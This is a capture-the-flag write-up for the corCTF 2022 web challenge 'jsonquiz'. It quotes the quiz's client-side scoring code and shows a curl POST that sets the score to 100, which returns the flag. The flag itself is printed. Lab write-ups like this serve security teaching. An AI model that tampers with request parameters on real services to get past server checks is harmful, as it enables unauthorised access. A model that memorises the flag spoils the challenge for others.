---
tags: writeup, corctf2022
---
# Writeup - web/jsonquiz
## Challenge
Author: strellic
How well do you know JSON? Take this quiz and find out!
## Solution
Opening up the site we see a page with some text and a button to start the quiz.
Looking at the source we find a quiz.js file. The logic of the quiz is there including scoring:
``` 
    // TODO: implement scoring somehow
    // kinda lazy, ill figure this out some other time

    setTimeout(() => {
        let score = 0;
        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "score=" + score
        })
        .then(r => r.json())
        .then(j => {
            if (j.pass) {
                $("#reward").innerText = j.flag;
                $("#pass").style.display = "block";
            }
            else {
                $("#fail").style.display = "block";
            }
        });
    }
```
The user can completely control the score, so i just gave myself 100 points!
```
> curl -X POST "https://jsonquiz.be.ax/submit" -d "score=100"

{"pass":true, "flag":"corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}"}
```
## Flag
corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}